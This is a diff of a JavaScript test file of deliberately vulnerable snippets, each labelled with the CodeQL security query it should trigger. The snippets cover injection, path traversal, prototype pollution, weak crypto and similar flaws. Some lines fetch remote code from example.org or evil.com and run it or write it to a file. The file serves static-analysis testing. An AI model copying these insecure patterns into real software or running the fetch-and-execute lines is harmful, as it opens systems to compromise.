@@ -1,4 +1,4 @@
-# should trigger codeql/javascript/ql/src/Security/CWE-022/TaintedPath.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-022/TaintedPath.ql
 
 var fs = require('fs'),
     http = require('http'),
@@ -14,7 +14,7 @@ var server = http.createServer(function(req, res) {
   res.write(fs.readFileSync("/home/user/" + path));
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-022/ZipSlip.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-022/ZipSlip.ql
 
 const fs = require('fs');
 const unzip = require('unzip');
@@ -27,7 +27,7 @@ fs.createReadStream('archive.zip')
     entry.pipe(fs.createWriteStream(fileName));
   });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-073/TemplateObjectInjection.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-073/TemplateObjectInjection.ql 
 
 var app = require('express')();
 app.set('view engine', 'hbs');
@@ -37,7 +37,7 @@ app.post('/', function (req, res, next) {
     res.render('index', profile);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-078/IndirectCommandInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-078/IndirectCommandInjection.ql
 
 var cp = require("child_process");
 
@@ -46,7 +46,7 @@ const script = path.join(__dirname, 'bin', 'main.js');
 cp.execSync(`node ${script} ${args.join(' ')}"`); // BAD
 
 
-# should trigger codeql/javascript/ql/src/Security/CWE-078/CommandInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-078/CommandInjection.ql
 
 var cp = require("child_process"),
     http = require('http'),
@@ -58,7 +58,7 @@ var server = http.createServer(function(req, res) {
     cp.exec(cmd); // BAD
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-078/UnsafeShellCommandConstruction.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-078/UnsafeShellCommandConstruction.ql
 
 var cp = require("child_process");
 
@@ -66,7 +66,7 @@ module.exports = function download(path, callback) {
   cp.exec("wget " + path, callback);
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-078/ShellCommandInjectionFromEnvironment.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-078/ShellCommandInjectionFromEnvironment.ql 
 
 var cp = require("child_process"),
   path = require("path");
@@ -75,7 +75,7 @@ function cleanupTemp() {
   cp.execSync(cmd); // BAD
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-078/UselessUseOfCat.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-078/UselessUseOfCat.ql
 
 var child_process = require('child_process');
 
@@ -83,7 +83,7 @@ module.exports = function (name) {
     return child_process.execSync("cat " + name).toString();
 };
 
-# should trigger codeql/javascript/ql/src/Security/CWE-089/SqlInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-089/SqlInjection.ql
 
 const app = require("express")(),
       pg = require("pg"),
@@ -107,7 +107,7 @@ app.get("search", function handler(req, res) {
   });
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-1004/ClientExposedCookie.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-1004/ClientExposedCookie.ql
 
 const http = require('http');
 
@@ -117,7 +117,7 @@ const server = http.createServer((req, res) => {
     res.end('<h2>Hello world</h2>');
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-117/LogInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-117/LogInjection.ql
 
 const http = require('http');
 const url = require('url');
@@ -130,7 +130,7 @@ const server = http.createServer((req, res) => {
 
 server.listen(3000, '127.0.0.1', () => {});
 
-# should trigger codeql/javascript/ql/src/Security/CWE-1275/SameSiteNoneCookie.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-1275/SameSiteNoneCookie.ql
 
 const http = require('http');
 
@@ -140,7 +140,7 @@ const server = http.createServer((req, res) => {
     res.end('<h2>Hello world</h2>');
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-134/TaintedFormatString.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-134/TaintedFormatString.ql
 
 const app = require("express")();
 
@@ -150,7 +150,7 @@ app.get("unauthorized", function handler(req, res) {
   console.log("Unauthorized access attempt by " + user, ip);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-178/CaseSensitiveMiddlewarePath.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-178/CaseSensitiveMiddlewarePath.ql
 
 const app = require('express')();
 
@@ -166,7 +166,7 @@ app.get('/admin/users/:id', (req, res) => {
     res.send(app.database.users[req.params.id]);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-200/FileAccessToHttp.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-200/FileAccessToHttp.ql
 
 var fs = require("fs"),
     https = require("https");
@@ -179,7 +179,7 @@ https.get({
   headers: { Referer: content }
 }, () => { });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-200/PrivateFileExposure.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-200/PrivateFileExposure.ql
 
 
 var express = require('express');
@@ -188,11 +188,11 @@ var app = express();
 
 app.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));
 
-# should trigger codeql/javascript/ql/src/Security/CWE-201/PostMessageStar.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-201/PostMessageStar.ql
 
 window.parent.postMessage(userName, '*');
 
-# should trigger codeql/javascript/ql/src/Security/CWE-209/StackTraceExposure.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-209/StackTraceExposure.ql
 
 var http = require('http');
 
@@ -213,7 +213,7 @@ http.createServer(function onRequest(req, res) {
   res.end(body);
 }).listen(3000);
 
-# should trigger codeql/javascript/ql/src/Security/CWE-295/DisablingCertificateValidation.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-295/DisablingCertificateValidation.ql
 
 let https = require("https");
 
@@ -230,17 +230,8 @@ https.request(
   }
 );
 
-# should trigger codeql/javascript/ql/src/Security/CWE-300/InsecureDependencyResolution.ql
 
-{
-  "name": "example-project",
-  "dependencies": {
-    "unencrypted": "http://example.org/foo/tarball/release/0.0.1",
-    "lodash": "^4.0.0"
-  }
-}
-
-# should trigger codeql/javascript/ql/src/Security/CWE-312/BuildArtifactLeak.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-312/BuildArtifactLeak.ql
 
 const webpack = require("webpack");
 
@@ -252,7 +243,7 @@ module.exports = [{
     ]
 }];
 
-# should trigger codeql/javascript/ql/src/Security/CWE-312/CleartextLogging.ql OR codeql/javascript/ql/src/Security/CWE-312/CleartextStorage.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-312/CleartextLogging.ql OR codeql/javascript/ql/src/Security/CWE-312/CleartextStorage.ql
 
 var express = require('express');
 
@@ -263,7 +254,7 @@ app.get('/remember-password', function (req, res) {
   res.cookie("password", pw);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-327/BadRandomness.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-327/BadRandomness.ql 
 
 const crypto = require('crypto');
 
@@ -272,7 +263,7 @@ for (let i = 0; i < 10; i++) {
     digits.push(crypto.randomBytes(1)[0] % 10); // NOT OK
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-327/BrokenCryptoAlgorithm.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-327/BrokenCryptoAlgorithm.ql
 
 const crypto = require('crypto');
 
@@ -281,7 +272,7 @@ var secretText = obj.getSecretText();
 const desCipher = crypto.createCipher('des', key);
 let desEncrypted = desCipher.write(secretText, 'utf8', 'hex'); // BAD: weak encryption
 
-# should trigger codeql/javascript/ql/src/Security/CWE-338/InsecureRandomness.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-338/InsecureRandomness.ql
 
 function insecurePassword() {
     // BAD: the random suffix is not cryptographically secure
@@ -290,7 +281,7 @@ function insecurePassword() {
     return password;
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-346/CorsMisconfigurationForCredentials.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-346/CorsMisconfigurationForCredentials.ql
 
 var https = require('https'),
     url = require('url');
@@ -306,7 +297,7 @@ server.on('request', function(req, res) {
     // ...
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-347/MissingJWTKeyVerification.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-347/MissingJWTKeyVerification.ql
 
 const jwt = require("jsonwebtoken");
 
@@ -315,7 +306,7 @@ const secret = "my-secret-key";
 var token = jwt.sign({ foo: 'bar' }, secret, { algorithm: "none" })
 jwt.verify(token, false, { algorithms: ["HS256", "none"] })
 
-# should trigger codeql/javascript/ql/src/Security/CWE-352/MissingCsrfMiddleware.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-352/MissingCsrfMiddleware.ql
 
 var app = require("express")(),
   cookieParser = require("cookie-parser"),
@@ -329,7 +320,7 @@ app.post("/changeEmail", function(req, res) {
   // ...
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-367/FileSystemRace.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-367/FileSystemRace.ql
 
 const fs = require("fs");
 const os = require("os");
@@ -341,7 +332,7 @@ if (!fs.existsSync(filePath)) {
   fs.writeFileSync(filePath, "Hello", { mode: 0o600 });
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-377/InsecureTemporaryFile.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-377/InsecureTemporaryFile.ql
 
 const fs = require('fs');
 const os = require('os');
@@ -350,7 +341,7 @@ const path = require('path');
 const file = path.join(os.tmpdir(), "test-" + (new Date()).getTime() + ".txt");
 fs.writeFileSync(file, "content");
 
-# should trigger codeql/javascript/ql/src/Security/CWE-384/SessionFixation.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-384/SessionFixation.ql
 
 const express = require('express');
 const session = require('express-session');
@@ -371,7 +362,7 @@ app.post('/login', function (req, res) {
     }
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-400/DeepObjectResourceExhaustion.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-400/DeepObjectResourceExhaustion.ql
 
 import express from 'express';
 import Ajv from 'ajv';
@@ -388,7 +379,7 @@ app.get('/user/:id', function(req, res) {
 	// ...
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-400/RemotePropertyInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-400/RemotePropertyInjection.ql
 
 var express = require('express');
 
@@ -401,7 +392,7 @@ app.get('/user/:id', function(req, res) {
 	console.log("Request object " + myObj);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-451/MissingXFrameOptions.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-451/MissingXFrameOptions.ql
 
 var express = require('express'),
     app = express();
@@ -419,7 +410,7 @@ app.get('/', function (req, res) {
     res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))
 })
 
-# should trigger codeql/javascript/ql/src/Security/CWE-502/UnsafeDeserialization.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-502/UnsafeDeserialization.ql
 
 const app = require("express")(),
   jsyaml = require("js-yaml");
@@ -429,7 +420,7 @@ app.get("load", function(req, res) {
   // ...
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-506/HardcodedDataInterpretedAsCode.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-506/HardcodedDataInterpretedAsCode.ql 
 
 var r = require;
 
@@ -440,7 +431,7 @@ function e(r) {
 // BAD: hexadecimal constant decoded and interpreted as import path
 var n = r(e("2e2f746573742f64617461"));
 
-# should trigger codeql/javascript/ql/src/Security/CWE-598/SensitiveGetQuery.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-598/SensitiveGetQuery.ql
 const express = require('express');
 const app = express();
 app.use(require('body-parser').urlencoded({ extended: false }))
@@ -467,7 +458,7 @@ app.post('/login2', (req, res) => {
     }
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-601/ServerSideUrlRedirect.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-601/ServerSideUrlRedirect.ql
 
 const app = require("express")();
 
@@ -476,11 +467,11 @@ app.get('/some/path', function(req, res) {
   res.redirect(req.param("target"));
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-601/ClientSideUrlRedirect.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-601/ClientSideUrlRedirect.ql
 
 window.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];
 
-# should trigger codeql/javascript/ql/src/Security/CWE-611/Xxe.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-611/Xxe.ql
 
 const app = require("express")(),
   libxml = require("libxmljs");
@@ -490,7 +481,7 @@ app.post("upload", (req, res) => {
     doc = libxml.parseXml(xmlSrc, { noent: true });
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-614/ClearTextCookie.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-614/ClearTextCookie.ql
 
 const http = require('http');
 
@@ -500,7 +491,7 @@ const server = http.createServer((req, res) => {
     res.end('<h2>Hello world</h2>');
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-640/HostHeaderPoisoningInEmailGeneration.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-640/HostHeaderPoisoningInEmailGeneration.ql
 
 let nodemailer = require('nodemailer');
 let express = require('express');
@@ -522,7 +513,7 @@ app.post('/resetpass', (req, res) => {
   });
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-643/XpathInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-643/XpathInjection.ql
 
 const express = require('express');
 const xpath = require('xpath');
@@ -538,7 +529,7 @@ app.get('/some/route', function(req, res) {
   });
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-730/RegExpInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-730/RegExpInjection.ql
 
 var express = require('express');
 var app = express();
@@ -550,7 +541,7 @@ app.get('/findKey', function(req, res) {
   var re = new RegExp("\\b" + key + "=(.*)\n");
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-730/ServerCrash.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-730/ServerCrash.ql
 
 const express = require("express"),
   fs = require("fs");
@@ -575,7 +566,7 @@ express().post("/save", (req, res) => {
   });
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-754/UnvalidatedDynamicMethodCall.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-754/UnvalidatedDynamicMethodCall.ql
 
 var express = require('express');
 var app = express();
@@ -595,7 +586,7 @@ app.get('/perform/:action/:payload', function(req, res) {
   res.end(action(req.params.payload));
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-770/MissingRateLimiting.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-770/MissingRateLimiting.ql
 
 var express = require('express');
 var app = express();
@@ -606,7 +597,7 @@ app.get('/:path', function(req, res) {
     res.sendFile(path);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-770/ResourceExhaustion.ql (3)
+// should trigger codeql/javascript/ql/src/Security/CWE-770/ResourceExhaustion.ql (3)
 
 var http = require("http"),
     url = require("url");
@@ -640,7 +631,7 @@ var server = http.createServer(function(req, res) {
 
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-776/XmlBomb.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-776/XmlBomb.ql
 
 const app = require("express")(),
   expat = require("node-expat");
@@ -653,7 +644,7 @@ app.post("upload", (req, res) => {
   parser.write(xmlSrc);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-798/HardcodedCredentials.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-798/HardcodedCredentials.ql
 
 const pg = require("pg");
 
@@ -666,7 +657,7 @@ const client = new pg.Client({
 });
 client.connect();
 
-# should trigger codeql/javascript/ql/src/Security/CWE-807/ConditionalBypass.ql OR codeql/javascript/ql/src/Security/CWE-807/DifferentKindsComparisonBypass.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-807/ConditionalBypass.ql OR codeql/javascript/ql/src/Security/CWE-807/DifferentKindsComparisonBypass.ql 
 
 var express = require('express');
 var app = express();
@@ -682,7 +673,7 @@ app.get('/full-profile/:userId', function(req, res) {
 
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-829/InsecureDownload.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-829/InsecureDownload.ql
 
 const fetch = require("node-fetch");
 const cp = require("child_process");
@@ -691,7 +682,7 @@ fetch('http://mydownload.example.org/myscript.sh')
     .then(res => res.text())
     .then(script => cp.execSync(script));
 
-# should trigger codeql/javascript/ql/src/Security/CWE-830/FunctionalityFromUntrustedSource.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-830/FunctionalityFromUntrustedSource.ql
 
 <html>
     <head>
@@ -703,7 +694,7 @@ fetch('http://mydownload.example.org/myscript.sh')
     </body>
 </html>
 
-# should trigger codeql/javascript/ql/src/Security/CWE-834/LoopBoundInjection.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-834/LoopBoundInjection.ql
 
 var express = require('express');
 var app = express();
@@ -719,7 +710,7 @@ app.post("/foo", (req, res) => {
     }
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-843/TypeConfusionThroughParameterTampering.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-843/TypeConfusionThroughParameterTampering.ql
 
 var app = require("express")(),
   path = require("path");
@@ -738,7 +729,7 @@ app.get("/user-files", function(req, res) {
   }
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-912/HttpToFileAccess.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-912/HttpToFileAccess.ql
 
 var https = require("https");
 var fs = require("fs");
@@ -749,7 +740,7 @@ https.get('https://evil.com/script', res => {
   })
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingAssignment.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingAssignment.ql 
 
 let express = require('express');
 let app = express()
@@ -764,7 +755,7 @@ app.put('/todos/:id', (req, res) => {
     res.end(200);
 });
 
-# should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingFunction.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingFunction.ql
 
 function merge(dst, src) {
     for (let key in src) {
@@ -777,7 +768,7 @@ function merge(dst, src) {
     }
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingMergeCall.ql 
+// should trigger codeql/javascript/ql/src/Security/CWE-915/PrototypePollutingMergeCall.ql 
 
 app.get('/news', (req, res) => {
   let prefs = lodash.merge({}, JSON.parse(req.query.prefs));
@@ -789,7 +780,7 @@ app.get('/news', (req, res) => {
   });
 })
 
-# should trigger codeql/javascript/ql/src/Security/CWE-916/InsufficientPasswordHash.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-916/InsufficientPasswordHash.ql
 
 const crypto = require("crypto");
 function hashPassword(password) {
@@ -798,7 +789,7 @@ function hashPassword(password) {
     return hashed;
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-918/ClientSideRequestForgery.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-918/ClientSideRequestForgery.ql
 
 async function loadMessage() {
     const query = new URLSearchParams(location.search);
@@ -807,7 +798,7 @@ async function loadMessage() {
     document.getElementById('message').innerHTML = data.html;
 }
 
-# should trigger codeql/javascript/ql/src/Security/CWE-918/RequestForgery.ql
+// should trigger codeql/javascript/ql/src/Security/CWE-918/RequestForgery.ql
 
 import http from 'http';
 import url from 'url';
